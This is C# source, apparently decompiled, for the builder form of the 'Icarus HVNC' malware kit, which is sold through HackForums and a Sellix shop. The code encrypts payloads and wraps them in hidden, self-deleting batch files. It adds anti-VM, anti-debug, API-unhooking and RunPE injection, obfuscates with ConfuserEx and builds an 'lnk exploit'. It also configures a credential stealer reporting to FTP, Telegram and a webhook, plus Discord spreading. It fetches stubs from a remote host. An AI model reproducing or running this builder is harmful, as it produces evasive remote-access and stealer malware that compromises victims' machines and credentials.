        private void aesEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (aesEncryption.Checked)
            {
                xorEncryption.Checked = false;
            }
        }

        private void xorEncryption_CheckedChanged(object sender, EventArgs e)
        {
            if (xorEncryption.Checked)
            {
                aesEncryption.Checked = false;
            }
        }

        private void Crypt(string file)
        {
            listBox2.Items.Clear();
            Random rng = new Random();
            byte[] key = Convert.FromBase64String(key1.Text);
            byte[] iv = Convert.FromBase64String(iv1.Text);
            byte[] key2 = Convert.FromBase64String(this.key2.Text);
            byte[] iv2 = Convert.FromBase64String(iv6.Text);
            EncryptionMode encryptionMode = (xorEncryption.Checked ? EncryptionMode.XOR : EncryptionMode.AES);
            if (!File.Exists(file))
            {
                MessageBox.Show("Invalid input path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                button1.Enabled = true;
                return;
            }
            if (Path.GetExtension(file) != ".exe")
            {
                MessageBox.Show("Invalid input file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                button1.Enabled = true;
                return;
            }
            Console.ForegroundColor = ConsoleColor.Gray;
            byte[] array = File.ReadAllBytes(file);
            bool flag;
            if (flag = HVNC.StubUtils.Utils.IsAssembly(file))
            {
                listBox2.Items.Add("Patching assembly...");
                array = Patcher.Fix(array);
            }
            listBox2.Items.Add("Encrypting payload...");
            byte[] bytes = HVNC.StubUtils.Utils.Encrypt(encryptionMode, HVNC.StubUtils.Utils.Compress(array), key2, iv2);
            listBox2.Items.Add("Creating stub...");
            string text = StubGen.CreateCS(key2, iv2, encryptionMode, antiDebug.Checked, antiVM.Checked, !flag, rng);
            listBox2.Items.Add("Building stub...");
            string tempFileName = Path.GetTempFileName();
            File.WriteAllBytes("payload.exe", bytes);
            byte[] bytes2 = HVNC.StubUtils.Utils.Encrypt(encryptionMode, HVNC.StubUtils.Utils.Compress(HVNC.StubUtils.Utils.GetEmbeddedResource("Shitarus.HVNC.Resources.apiunhooker.dll")), key2, iv2);
            File.WriteAllBytes("apiunhooker.dll", bytes2);
            if (!flag)
            {
                byte[] bytes3 = HVNC.StubUtils.Utils.Encrypt(encryptionMode, HVNC.StubUtils.Utils.Compress(HVNC.StubUtils.Utils.GetEmbeddedResource("Shitarus.HVNC.Resources.runpe.dll")), key2, iv2);
                File.WriteAllBytes("runpe.dll", bytes3);
            }
            CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
            CompilerParameters compilerParameters = new CompilerParameters(new string[4] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" }, tempFileName)
            {
                GenerateExecutable = true,
                CompilerOptions = "/optimize",
                IncludeDebugInformation = false
            };
            compilerParameters.EmbeddedResources.Add("payload.exe");
            compilerParameters.EmbeddedResources.Add("apiunhooker.dll");
            if (!flag)
            {
                compilerParameters.EmbeddedResources.Add("runpe.dll");
            }
            foreach (string item in listBox1.Items)
            {
                compilerParameters.EmbeddedResources.Add(item);
            }
            CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, text);
            if (compilerResults.Errors.Count > 0)
            {
                File.Delete("payload.txt");
                if (!flag)
                {
                    File.Delete("runpe.dll");
                }
                File.Delete(tempFileName);
                List<string> list = new List<string>();
                foreach (CompilerError error in compilerResults.Errors)
                {
                    list.Add(error.ToString());
                }
                MessageBox.Show("Stub build errors:" + Environment.NewLine + string.Join(Environment.NewLine, list), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                button1.Enabled = true;
                return;
            }
            byte[] bytes4 = File.ReadAllBytes(tempFileName);
            File.Delete("payload.exe");
            File.Delete("apiunhooker.dll");
            if (!flag)
            {
                File.Delete("runpe.dll");
            }
            File.Delete(tempFileName);
            listBox2.Items.Add("Encrypting stub...");
            byte[] inArray = HVNC.StubUtils.Utils.Encrypt(encryptionMode, HVNC.StubUtils.Utils.Compress(bytes4), key, iv);
            listBox2.Items.Add("Creating batch file...");
            string text2 = FileGen.CreateBat(key, iv, encryptionMode, hidden.Checked, selfDelete.Checked, rng);
            text2 += Convert.ToBase64String(inArray);
            listBox2.Items.Add("Writing output...");
            File.WriteAllText(Path.ChangeExtension(file, "bat"), text2, Encoding.ASCII);
            button1.Enabled = true;
        }

        private void UpdateKeys(object sender, EventArgs e)
        {
            AesManaged aesManaged = new AesManaged();
            key1.Text = Convert.ToBase64String(aesManaged.Key);
            iv1.Text = Convert.ToBase64String(aesManaged.IV);
            aesManaged.Dispose();
            aesManaged = new AesManaged();
            key2.Text = Convert.ToBase64String(aesManaged.Key);
            iv6.Text = Convert.ToBase64String(aesManaged.IV);
            aesManaged.Dispose();
        }

        private static void Confuser(string file, string output)
        {
            string path = Path.GetTempPath() + "them.tmd";
            string config = Resources.config;
            config = config.Replace("%path%", Path.GetTempPath()).Replace("%stub%", file);
            File.WriteAllText(Path.GetTempPath() + "configconfuser.crproj", config);
            File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", Resources.ConfuserEx);
            if (Directory.Exists(Path.GetTempPath() + "Confuser"))
            {
                Directory.Delete(Path.GetTempPath() + "Confuser", recursive: true);
                Directory.CreateDirectory(Path.GetTempPath() + "Confuser");
            }
            ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", Path.GetTempPath() + "Confuser");
            Interaction.Shell(Path.GetTempPath() + "Confuser\\Confuser.CLI.exe -n " + Path.GetTempPath() + "configconfuser.crproj", AppWinStyle.Hide, Wait: true);
            File.Delete(file + ".bak");
            File.Delete(Path.GetTempPath() + "confuser.zip");
            File.Delete(Path.GetTempPath() + "configconfuser.crproj");
            File.Delete(path);
            Directory.Delete(Path.GetTempPath() + "Confuser", recursive: true);
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            if (!string.IsNullOrWhiteSpace(HVNC.Properties.Settings.Default.HOOK))
            {
                txtWebHook.Text = HVNC.Properties.Settings.Default.HOOK;
            }
            if (!string.IsNullOrWhiteSpace(HVNC.Properties.Settings.Default.TGID) || !string.IsNullOrWhiteSpace(HVNC.Properties.Settings.Default.TGTOKEN))
            {
                txtTGID.Text = HVNC.Properties.Settings.Default.TGID;
                txtTGTOKEN.Text = HVNC.Properties.Settings.Default.TGTOKEN;
            }
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP))
            {
                socket.Connect("8.8.8.8", 65530);
                IPEndPoint iPEndPoint = socket.LocalEndPoint as IPEndPoint;
                string text = iPEndPoint.Address.ToString();
                txtIP.Text = string.Empty;
                txtIP.Text = text;
            }
            txtPORT.Text = HVNC.Properties.Settings.Default.PORT;
            txtMutex.Text = RandomMutex(9);
            txtIdentifier.Text = "Icarus_Client";
            txtFolder.Text = RandomMutex(9);
            txtFilename.Text = RandomMutex(9) + ".exe";
            SettingsObject settingsObject = HVNC.StubUtils.Settings.Load();
            if (settingsObject != null)
            {
                antiDebug.Checked = settingsObject.antiDebug;
                antiVM.Checked = settingsObject.antiVM;
                selfDelete.Checked = settingsObject.selfDelete;
                hidden.Checked = settingsObject.hidden;
                aesEncryption.Checked = settingsObject.aes;
                xorEncryption.Checked = settingsObject.xor;
            }
            UpdateKeys(sender, e);
        }

        public static string RandomMutex(int length)
        {
            return new string(Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length).Select(__c.__9__19_0 ?? (__c.__9__19_0 = __c.__9._RandomMutex_b__19_0)).ToArray());
        }

        public static string RandomNumber(int length)
        {
            return new string(Enumerable.Repeat("0123456789", length).Select(__c.__9__20_0 ?? (__c.__9__20_0 = __c.__9._RandomNumber_b__20_0)).ToArray());
        }

        private void button2_Click(object sender, EventArgs e)
        {
            txtMutex.Text = RandomMutex(9);
        }

        private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            SaveSettings();
        }

        public void SaveSettings()
        {
            try
            {
                HVNC.Properties.Settings.Default.PORT = txtPORT.Text;
                HVNC.Properties.Settings.Default.IP = txtIP.Text;
                HVNC.Properties.Settings.Default.Save();
            }
            catch
            {
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            txtFolder.Text = RandomMutex(9);
            txtFilename.Text = RandomMutex(9) + ".exe";
        }

        private void studioButton5_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void studioButton4_Click(object sender, EventArgs e)
        {
            base.WindowState = FormWindowState.Minimized;
        }

        private void primeButton1_Click(object sender, EventArgs e)
        {
            string pORT = HVNC.Properties.Settings.Default.PORT;
            txtPORT.Text = pORT;
        }

        private void primeButton2_Click(object sender, EventArgs e)
        {
            txtIdentifier.Text = RandomMutex(6);
        }

        private string GetIcon(string path)
        {
            try
            {
                string text = Path.GetTempFileName() + ".ico";
                using (FileStream stream = new FileStream(text, FileMode.Create))
                {
                    IconExtractor.Extract1stIconTo(path, stream);
                }
                return text;
            }
            catch
            {
            }
            return "";
        }

        private void primeButton3_Click(object sender, EventArgs e)
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Choose Icon";
            openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
                {
                    string imageLocation = GetIcon(openFileDialog.FileName);
                    txtIcon.Text = imageLocation;
                    pictureBoxicon.ImageLocation = imageLocation;
                }
                else
                {
                    txtIcon.Text = openFileDialog.FileName;
                    pictureBoxicon.ImageLocation = openFileDialog.FileName;
                }
            }
        }

        private void chkNet2_CheckedChanged(object sender, EventArgs e)
        {
            if (chkNet2.Checked)
            {
                chkNet4.Checked = false;
            }
        }

        private void toggleButtonicon_CheckedChanged(object sender, EventArgs e)
        {
            if (toggleButtonicon.Checked)
            {
                txtIcon.Enabled = true;
            }
            else
            {
                txtIcon.Enabled = false;
            }
        }

        private void toggleSwitch1_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void chkBatch_CheckedChanged(object sender, EventArgs e)
        {
            if (chkBatch.Checked)
            {
                listBox1.Enabled = true;
                btnBinderBrowse.Enabled = true;
                btnBinderDelete.Enabled = true;
                antiVM.Enabled = true;
                antiDebug.Enabled = true;
                hidden.Enabled = true;
                selfDelete.Enabled = true;
                key1.Enabled = true;
                key2.Enabled = true;
                iv1.Enabled = true;
                iv6.Enabled = true;
                refreshKeys.Enabled = true;
                aesEncryption.Enabled = true;
                xorEncryption.Enabled = true;
            }
            else
            {
                listBox1.Enabled = false;
                btnBinderBrowse.Enabled = false;
                btnBinderDelete.Enabled = false;
                antiVM.Enabled = false;
                antiDebug.Enabled = false;
                hidden.Enabled = false;
                selfDelete.Enabled = false;
                key1.Enabled = false;
                key2.Enabled = false;
                iv1.Enabled = false;
                iv6.Enabled = false;
                refreshKeys.Enabled = false;
                aesEncryption.Enabled = false;
                xorEncryption.Enabled = false;
            }
        }

        private void chkNet4_CheckedChanged(object sender, EventArgs e)
        {
            if (chkNet4.Checked)
            {
                chkNet2.Checked = false;
            }
        }

        private void chkObf_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://www.hackforum.im/forums/topic/icarus-hvnc/");
        }

        private void chkFakeLogin_CheckedChanged(object sender, EventArgs e)
        {
            if (chkFakeLogin.Checked)
            {
                txtWebHook.Enabled = true;
            }
            else
            {
                txtWebHook.Enabled = false;
            }
        }

        private void toggleSwitch1_CheckedChanged_1(object sender, EventArgs e)
        {
            if (chkMacro.Checked)
            {
                chkBin.Checked = true;
            }
            else
            {
                chkBin.Checked = false;
            }
        }

        private void chkASDoc_CheckedChanged(object sender, EventArgs e)
        {
            if (chkASDoc.Checked)
            {
                chkMacro.Checked = true;
            }
            else
            {
                chkMacro.Checked = false;
            }
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            Process.Start("https://hackforums.net/showthread.php?tid=6213458&pid=61552874#pid61552874");
        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/+5G2duYOf4Rw1MGUy");
        }

        private void pictureBox5_Click(object sender, EventArgs e)
        {
            Process.Start("https://icarusdevelopment.sellix.io");
        }

        private void primeButton4_Click(object sender, EventArgs e)
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Exe Files (.exe)|*.exe";
            openFileDialog.FilterIndex = 1;
            openFileDialog.RestoreDirectory = true;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtDiscFilePath.Text = openFileDialog.FileName;
                label34.Text = "Payload selected:" + Path.GetFileName(txtDiscFilePath.Text);
                label33.Text = "Payload added: True";
            }
        }

        private void chkSpread_CheckedChanged(object sender, EventArgs e)
        {
            if (chkSpread.Checked)
            {
                chkNet2.Checked = false;
                chkNet4.Checked = true;
                txtDiscFilePath.Enabled = true;
                txtDiscMessage.Enabled = true;
                txtDiscordFilename.Enabled = true;
            }
            else
            {
                txtDiscFilePath.Enabled = false;
                txtDiscMessage.Enabled = false;
                txtDiscordFilename.Enabled = false;
            }
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Choose Icon";
            openFileDialog.Filter = "Icons *.ico|*.ico";
            openFileDialog.Multiselect = false;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtIconPath.Text = openFileDialog.FileName;
                iconPreview.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(64, 64)).Handle);
            }
        }

        private void studioButton1_Click(object sender, EventArgs e)
        {
            _ = txtUrl.Text;
            string shortcutName = txtSname.Text;
            string description = txtSdesc.Text;
            string text = txtIconPath.Text;
            ink.CreateShortcut(text, shortcutName, description);
            MessageBox.Show("Your lnk exploit is located on" + Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location));
        }

        private void chkSpoof_CheckedChanged(object sender, EventArgs e)
        {
            if (chkSpoof.Checked)
            {
                rjComboBox1.Enabled = true;
            }
            else
            {
                rjComboBox1.Enabled = false;
            }
        }

        private void studioButton2_Click(object sender, EventArgs e)
        {
            HVNC.Properties.Settings.Default.FTPHOST = txtFTPHOST.Text;
            HVNC.Properties.Settings.Default.FTPUSER = txtFTPUSER.Text;
            HVNC.Properties.Settings.Default.FTPPASS = txtFTPPASS.Text;
            HVNC.Properties.Settings.Default.PHPLINK = txtPHPLINK.Text;
            HVNC.Properties.Settings.Default.TGTOKEN = txtTGTOKEN.Text;
            HVNC.Properties.Settings.Default.TGID = txtTGID.Text;
            HVNC.Properties.Settings.Default.HOOK = txtWebHook.Text;
            HVNC.Properties.Settings.Default.Save();
            MessageBox.Show("Stealer settings saved,now your stealer is ready for use!");
        }

        private void btnBinderBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.RestoreDirectory = true;
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                listBox1.Items.Add(openFileDialog.FileName);
            }
        }

        private void btnBinderDelete_Click(object sender, EventArgs e)
        {
            listBox1.Items.Remove(listBox1.SelectedItem);
        }

        private async Task Main_Loop()
        {
            listBox2.Items.Add("Server2 online.");
            listBox2.Items.Add("Adding icon... ");
            WebClient webClient = new WebClient();
            webClient.Credentials = CredentialCache.DefaultCredentials;
            string fileName = txtIcon.Text.ToString();
            webClient.UploadFile("https://icarus.loca.lt/crypt/public/post_ico_file", "POST", fileName);
            webClient.Dispose();
            WebClient webClient2 = new WebClient();
            webClient2.Credentials = CredentialCache.DefaultCredentials;
            string text = ((!chkStartup.Checked) ? "False" : "True");
            string text2 = ((!chkWDEX.Checked) ? "False" : "True");
            string text3 = ((!chkUCA.Checked) ? "False" : "True");
            string text4 = ((!chkWatcher.Checked) ? "False" : "True");
            string text5 = "False";
            if (chkNet2.Checked)
            {
                netversion = "net2";
                string text6 = netversion.Trim() + " " + txtIP.Text.Trim() + " " + txtPORT.Text.Trim() + " " + txtMutex.Text.Trim() + " " + text + " " + text2 + " " + text3 + " " + text4 + " " + text5;
                BeginInvoke(new MethodInvoker(_Main_Loop_b__53_0));
                string requestUriString = "https://icarus.loca.lt/crypt/public/post_file/" + text6;
                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
                httpWebRequest.Method = "GET";
                _ = (HttpWebResponse)httpWebRequest.GetResponse();
                webClient2.Dispose();
                BeginInvoke(new MethodInvoker(_Main_Loop_b__53_1));
                if (text5 == "True")
                {
                    webClient2.DownloadFile("https://icarus.loca.lt/crypt/public/IcarusRDP_builder/ICARUS/stub_converted.exe", txtFilename.Text.Trim());
                }
                else
                {
                    webClient2.DownloadFile("https://icarus.loca.lt/crypt/public/IcarusRDP_builder/ICARUS/stub.exe", txtFilename.Text.Trim());
                }
                BeginInvoke(new MethodInvoker(_Main_Loop_b__53_2));
            }
            else
            {
                netversion = "net4";
                string text7 = netversion.Trim() + " " + txtIP.Text.Trim() + " " + txtPORT.Text.Trim() + " " + txtMutex.Text.Trim() + " " + text + " " + text2 + " " + text3 + " " + text4 + " " + text5;
                BeginInvoke(new MethodInvoker(_Main_Loop_b__53_3));
                string requestUriString2 = "https://icarus.loca.lt/crypt/public/post_file/" + text7;
                HttpWebRequest httpWebRequest2 = (HttpWebRequest)WebRequest.Create(requestUriString2);
                httpWebRequest2.Method = "GET";
                _ = (HttpWebResponse)httpWebRequest2.GetResponse();
                webClient2.Dispose();
                BeginInvoke(new MethodInvoker(_Main_Loop_b__53_4));
                if (text5 == "True")
                {
                    webClient2.DownloadFile("https://icarus.loca.lt/crypt/public/IcarusRDP_builder/ICARUS/stub_converted.exe", txtFilename.Text.Trim());
                }
                else
                {
                    webClient2.DownloadFile("https://icarus.loca.lt/crypt/public/IcarusRDP_builder/ICARUS/stub.exe", txtFilename.Text.Trim());
                }
                BeginInvoke(new MethodInvoker(_Main_Loop_b__53_5));
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            ShitarusPrivate.Bloom bloom1 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom2 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom3 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom4 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom5 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom6 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom7 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom8 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom9 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom10 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom11 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom12 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom13 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom14 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom15 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom16 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom17 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom18 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom19 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom20 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom21 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom22 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom23 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom24 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom25 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom26 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom27 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom28 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom29 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom30 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom31 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom32 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom33 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom34 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom35 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom36 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom37 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom38 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom39 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom40 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom41 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom42 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom43 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom44 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom45 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom46 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom47 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom48 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom49 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom50 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom51 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom52 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom53 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom54 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom55 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom56 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom57 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom58 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom59 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom60 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom61 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom62 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom63 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom64 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom65 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom66 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom67 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom68 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom69 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom70 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom71 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom72 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom73 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom74 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom75 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom76 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom77 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom78 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom79 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom80 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom81 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom82 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom83 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom84 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom85 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom86 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom87 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom88 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom89 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom90 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom91 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom92 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom93 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom94 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom95 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom96 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom97 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom98 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom99 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom100 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom101 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom102 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom103 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom104 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom105 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom106 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom107 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom108 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom109 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom110 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom111 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom112 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom113 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom114 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom115 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom116 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom117 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom118 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom119 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom120 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom121 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom122 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom123 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom124 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom125 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom126 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom127 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom128 = new ShitarusPrivate.Bloom();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(StubBuilder));
            ShitarusPrivate.Bloom bloom129 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom130 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom131 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom132 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom133 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom134 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom135 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom136 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom137 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom138 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom139 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom140 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom141 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom142 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom143 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom144 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom145 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom146 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom147 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom148 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom149 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom150 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom151 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom152 = new ShitarusPrivate.Bloom();
